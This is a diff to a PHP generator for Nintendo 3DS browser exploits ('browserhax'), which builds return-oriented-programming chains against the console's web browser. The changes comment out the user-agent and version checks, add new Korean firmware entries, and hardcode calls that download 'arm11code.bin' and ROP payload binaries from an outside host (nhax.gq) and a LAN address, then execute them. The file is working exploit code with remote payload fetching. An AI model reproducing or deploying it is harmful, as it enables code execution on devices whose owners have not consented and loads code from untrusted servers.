@@ -3,6 +3,7 @@
 $getbinselect = -1;//Check the getbin param, for when handling a request from the curl httpdownload ROP below. This is done before the user-agent checks since the UA isn't set when downloading with the below curl ROP.
 $getbinparam =  "";
 if(isset($_REQUEST['getbin']))$getbinparam = $_REQUEST['getbin'];
+//$generatebinrop=1;
 
 browserhaxcfg_parsebinparam();
 
@@ -26,9 +27,9 @@ if($getbinselect==3)
 $ua = $_SERVER['HTTP_USER_AGENT'];
 if(!strstr($ua, "Mozilla/5.0 (Nintendo 3DS; U; ; ") && !strstr($ua, "Mozilla/5.0 (New Nintendo 3DS"))
 {
-	echo "This exploit only supports the Nintendo 3DS main web-browser(s).\n";
+	//echo "This exploit only supports the Nintendo 3DS main web-browser(s).\n\n";
 	//error_log("3dsbrowserhax_common.php: INVALID USER-AGENT.");
-	exit;
+	//exit;
 }
 
 if(!isset($generatebinrop))$generatebinrop = 0;
@@ -42,7 +43,7 @@ $browserver_regionbitmask = 0x0;
 
 if(!isset($browserver))
 {
-	$browserver = -1;
+	//$browserver = 0x88;
 
 	//v10.6/v10.7 are detected as the same browserver here because there's basically no difference between them for ROP-addrs and such.
 
@@ -132,7 +133,7 @@ if(!isset($browserver))
 	{
 		$browserver = 0x87;
 	}
-	else if(strstr($ua, "1.10.10166"))//1.10.10166 v10272 11.9.0-42
+	else if(strstr($ua, "1.10.10166"))//1.10.10166 v9192 11.9.0-42
 	{
 		$browserver = 0x88;
 	}
@@ -142,7 +143,7 @@ if($browserver == -1)
 {
 	echo "This browser version is not recognized/supported by 3ds_browserhax_common. Whether this also applies to the exploit you're using is a seperate matter. See the 3ds_browserhax_common repo README if you just want to see if the browser exploit crashes.\n";
 	//error_log("3dsbrowserhax_common.php: BROWSERVER NOT RECOGNIZED.");
-	exit;
+	//exit;
 }
 
 $browserver |= $browserver_regionbitmask;
@@ -530,6 +531,10 @@ else if($browserver == 0x57)//1.7616.KR v7168/10.2.0-28
 else if($browserver == 0x58)//1.7622.KR v8192/10.6.0-31. 1.7625.KR v9232/10.7.0-32.
 {
 	require_once("3dsbrowserhax_rop_spider_kor_v8192.php");
+}
+else if($browserver == 0x59)//1.7636.KR v11297/11.13.0-39
+{
+	require_once("3dsbrowserhax_rop_spider_kor_v11297.php");
 }
 else if($browserver == 0x66)//1.7610.TW v6149/9.9.0-26
 {
@@ -955,6 +960,10 @@ else if($browserver == 0xD6)
 {
     require_once("3dsbrowserhax_rop_skater_kor_v7184.php");
 }
+else if($browserver == 0xD7)
+{
+    require_once("3dsbrowserhax_rop_skater_kor_v10272.php");
+}
 else
 {
 	die("Unsupported browserver / region.");
@@ -1066,11 +1075,11 @@ $ARM9_HEAPHAXBUF = 0x80a2e80 - 0x2800;
 
 function genu32_unicode($value)
 {
-	$hexstr = sprintf("%08x", $value);
+	$hexstr = sprintf("0x%08x,\n", $value);
 
 	$outstr = "\u" . substr($hexstr, 4, 4) . "\u" . substr($hexstr, 0, 4);
 
-	return $outstr;
+	return $hexstr;
 }
 
 function genu32_unicode_jswrap($value)
@@ -1707,6 +1716,7 @@ function ropgen_httpdownload_binary($bufaddr, $bufsize, $binid)
 		$url = $cfg_arm11code_payloadbaseurl;
 	}
 	$url .= "?getbin=$binid";
+	$url=$binid;
 
 	ropgen_httpdownload($bufaddr, $bufsize, "", $url, 1);
 }
@@ -1892,7 +1902,7 @@ function generateropchain_type2()
 {
 	global $ROPHEAP, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, /*$IFile_Seek,*/ $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver, $FS_MOUNTSDMC, $ROP_snprintf, $ROP_curl_easy_cleanup, $ROP_curl_easy_init, $ROP_curl_easy_perform, $ROP_curl_easy_setopt;
 
-	$LINEAR_TMPBUF = 0x18B40000;
+	$LINEAR_TMPBUF = 0x18B40000;   //5da0000+14000000=19da0000
 	$LINEAR_VADDRBASE = 0x14000000;
 	if($browserver >= 0x80)
 	{
@@ -1913,7 +1923,7 @@ function generateropchain_type2()
 	ropgen_writeu32($ROPHEAP, 0x0100FFFF, 0, 1);
 	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that yellow is displayed.
 
-	ropgen_callfunc($LINEAR_TMPBUF, 0x11000, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);
+	ropgen_callfunc($LINEAR_TMPBUF, 0x10000, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);
 
 	if($arm11code_loadfromsd>=1 && $browserver>=0x80)//Open sdmc archive when running under SKATER.
 	{
@@ -1947,6 +1957,15 @@ function generateropchain_type2()
 		ropchain_appendu32(0x0);//r5
 		ropchain_appendu32(0x0);//r6
 	}
+	
+		//ropgen_httpdownload($LINEAR_CODETMPBUF, 0x10000, "sdmc:/browserhax_hblauncher_ropbin_payload.bin", "http://nhax.gq/r/ropbin_X_XX.bin", 0);
+		//ropgen_httpdownload($LINEAR_CODETMPBUF, 0x10000, "sdmc:/arm11code.bin", "http://nhax.gq/r/arm11code.bin", 0);
+		//ropgen_httpdownload($LINEAR_CODETMPBUF, 0x11000, "sdmc:/boot.3dsx", "http://nhax.gq/r/boot.3dsx", 0);
+		//ropgen_httpdownload($LINEAR_CODETMPBUF, 0x40000, "sdmc:/arm11code.bin", "http://192.168.1.89:8010/r/arm11code.bin", 0);
+		//ropgen_httpdownload($LINEAR_CODETMPBUF, 0x10000, "sdmc:/boot.3dsx", "http://nhax.gq/r/temp.3dsx", 0);
+		
+		//ropgen_writeu32($ROPHEAP, 0x01FF00FF, 0, 1);
+		//ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that magenta is displayed.
 
 	if($arm11code_loadfromsd==0)
 	{
@@ -1997,7 +2016,9 @@ function generateropchain_type2()
 	}
 	else if($arm11code_loadfromsd==2)
 	{
-		ropgen_httpdownload_binary($LINEAR_CODETMPBUF, $codebinsize, browserhaxcfg_getbinparam_type3());
+		ropgen_httpdownload($LINEAR_CODETMPBUF, 0x11000, "sdmc:/browserhax_hblauncher_ropbin_payload.bin", "http://nhax.gq/r/ropbin_X_XX.bin", 0);
+		ropgen_httpdownload($LINEAR_CODETMPBUF, 0x11000, "sdmc:/arm11code.bin", "http://nhax.gq/r/arm11code.bin", 0);
+		//ropgen_httpdownload_binary($LINEAR_CODETMPBUF, $codebinsize, browserhaxcfg_getbinparam_type3());
 	}
 
 	ropgen_callfunc($LINEAR_CODETMPBUF, $codebinsize, 0x0, 0x0, $POPPC, $GSP_FLUSHDCACHE);//Flush the data-cache for the loaded code.
@@ -2115,9 +2136,9 @@ function generateropchain_type3()
 	ropgen_writeu32($ROPHEAP, 0x010000FF, 0, 1);
 	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that red is displayed.
 
-	ropgen_callfunc($FILEBUF, 0x00200000+8, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);
+	//ropgen_callfunc($FILEBUF, 0x00200000+8, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);
 
-	ropgen_callfunc($IFile_ctx, 0x14, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the IFile ctx.
+	//ropgen_callfunc($IFile_ctx, 0x14, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the IFile ctx.
 
 	if($arm11code_loadfromsd>=1 && $browserver>=0x80)//Open sdmc archive when running under SKATER.
 	{
